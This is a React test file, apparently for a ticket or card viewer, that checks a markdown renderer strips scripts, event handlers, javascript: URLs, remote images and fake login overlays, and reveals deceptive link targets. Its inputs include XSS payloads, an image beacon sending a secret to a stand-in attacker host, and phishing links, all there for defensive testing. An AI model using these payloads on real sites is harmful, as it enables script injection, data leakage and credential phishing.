import { render, screen } from "@testing-library/react";
import { describe, expect, it } from "vitest";
import { MarkdownContent } from "./markdown-content";

function renderContent(content: string) {
  const { container } = render(<MarkdownContent content={content} />);
  return container;
}

describe("MarkdownContent", () => {
  it("renderiza o markdown da descrição do card", () => {
    renderContent("## Critérios de aceite\n\n- O card mostra o **responsável**.");

    expect(screen.getByRole("heading", { name: "Critérios de aceite" })).toBeInTheDocument();
    expect(screen.getByRole("listitem")).toHaveTextContent("O card mostra o responsável.");
    expect(screen.getByText("responsável").tagName).toBe("STRONG");
  });

  it("mantém o HTML inofensivo de um chamado", () => {
    renderContent("<p>Olá, <b>time</b>.</p>");

    expect(screen.getByText("time").tagName).toBe("B");
  });

  it("remove script, iframe, style e formulário", () => {
    const container = renderContent(
      [
        "<script>alert('xss')</script>",
        '<iframe src="https://example.com"></iframe>',
        "<style>body { display: none; }</style>",
        '<form action="https://example.com/login"><input name="senha"></form>',
        "<p>Texto do chamado</p>",
      ].join("\n")
    );

    expect(container.querySelector("script, iframe, style, form")).toBeNull();
    expect(screen.getByText("Texto do chamado")).toBeInTheDocument();
  });

  it("remove handler de evento e atributo style", () => {
    const container = renderContent(
      '<img src="https://example.com/a.png" onerror="alert(1)"><p style="color: red" onclick="alert(2)">Oi</p>'
    );

    expect(container.querySelector("img")).not.toHaveAttribute("onerror");
    expect(screen.getByText("Oi")).not.toHaveAttribute("onclick");
    expect(screen.getByText("Oi")).not.toHaveAttribute("style");
  });

  it("não deixa o texto carregar imagem ou mídia de outro site", () => {
    const container = renderContent(
      [
        "![](https://attacker.example/x.png?d=segredo)",
        '<img srcset="https://attacker.example/a.png 1x">',
        '<video poster="https://attacker.example/p.png"></video>',
        '<table background="https://attacker.example/b.png"><tr><td>x</td></tr></table>',
        '<svg><image href="https://attacker.example/s.png"></image></svg>',
      ].join("\n\n")
    );

    expect(container.querySelector("[src], [srcset], [poster], [background], svg")).toBeNull();
  });

  it("não deixa o texto cobrir a tela com interface falsa", () => {
    const container = renderContent(
      [
        '<a href="https://attacker.example/login" class="fixed inset-0 z-40">Sua sessão expirou</a>',
        "<dialog open>Entre de novo</dialog>",
        '<div popover="manual">Aviso</div>',
      ].join("\n")
    );

    expect(screen.getByText("Sua sessão expirou")).not.toHaveAttribute("class");
    expect(container.querySelector("dialog, [popover]")).toBeNull();
  });

  it("remove URL javascript: e data: de link", () => {
    renderContent(
      '[markdown](javascript:alert(1)) <a href="javascript:alert(2)">html</a> <a href="data:text/html,<script>alert(3)</script>">data</a>'
    );

    expect(screen.getByText("markdown").closest("a")).not.toHaveAttribute("href");
    expect(screen.getByText("html")).not.toHaveAttribute("href");
    expect(screen.getByText("data")).not.toHaveAttribute("href");
  });

  it("abre link externo em outra aba com noopener e noreferrer", () => {
    renderContent("[chamado no Movidesk](https://example.com/chamados/42)");

    const link = screen.getByRole("link", { name: "chamado no Movidesk" });
    expect(link).toHaveAttribute("target", "_blank");
    expect(link).toHaveAttribute("rel", "noopener noreferrer");
  });

  it("mantém o link interno na mesma aba, mesmo quando o texto pede outra", () => {
    renderContent('[MOM-123](/cards/MOM-123) <a href="/cards/MOM-124" target="_blank">MOM-124</a>');

    expect(screen.getByRole("link", { name: "MOM-123" })).not.toHaveAttribute("target");
    expect(screen.getByRole("link", { name: "MOM-124" })).not.toHaveAttribute("target");
  });

  it("deixa o destino do link à vista quando o texto pede cuidado, como o da IA", () => {
    render(
      <MarkdownContent
        showsLinkDestination
        content="[Entre de novo](https://atacante.exemplo.test/entrar) ou veja [o card](/cards/MOM-123)."
      />
    );

    expect(
      screen.getByRole("link", { name: "Entre de novo (https://atacante.exemplo.test/entrar)" })
    ).toHaveAttribute("rel", "noopener noreferrer");
    expect(screen.getByRole("link", { name: "o card (/cards/MOM-123)" })).toBeInTheDocument();
  });

  it("não repete o destino quando o texto do link já é o endereço", () => {
    render(<MarkdownContent showsLinkDestination content="<https://exemplo.test/ajuda>" />);

    expect(screen.getByRole("link")).toHaveTextContent(/^https:\/\/exemplo\.test\/ajuda$/);
  });

  it("não repete o destino do endereço sem caminho, que o navegador completa com a barra", () => {
    render(<MarkdownContent showsLinkDestination content="<https://exemplo.test>" />);

    expect(screen.getByRole("link")).toHaveTextContent(/^https:\/\/exemplo\.test$/);
  });

  it("mostra o endereço que o navegador abre, e não o que foi escrito para enganar", () => {
    render(
      <MarkdownContent
        showsLinkDestination
        content={[
          "[com tab](https://app.exemplo.test&#9;.atacante.test/x)",
          "[com usuário](https://app.exemplo.test@atacante.test/entrar)",
          "[sem esquema](//atacante.test/a)",
        ].join("\n\n")}
      />
    );

    expect(screen.getByRole("link", { name: /com tab/ })).toHaveTextContent(
      "com tab (https://app.exemplo.test.atacante.test/x)"
    );
    expect(screen.getByRole("link", { name: /com usuário/ })).toHaveTextContent(
      "com usuário (https://atacante.test/entrar)"
    );
    expect(screen.getByRole("link", { name: /sem esquema/ })).toHaveTextContent(
      /^sem esquema \(https?:\/\/atacante\.test\/a\)$/
    );
  });

  it("mostra o destino quando parte do texto do link está escondida", () => {
    render(
      <MarkdownContent
        showsLinkDestination
        content='<a href="https://app.exemplo.test.atacante.test/x">https://app.exemplo.test<span hidden>.atacante.test/x</span></a>'
      />
    );

    expect(screen.getByRole("link")).toHaveTextContent(
      /\(https:\/\/app\.exemplo\.test\.atacante\.test\/x\)$/
    );
  });

  it("não mostra o destino quando quem chama não pede", () => {
    renderContent("[chamado no Movidesk](https://example.com/chamados/42)");

    expect(screen.getByRole("link")).toHaveTextContent(/^chamado no Movidesk$/);
  });
});
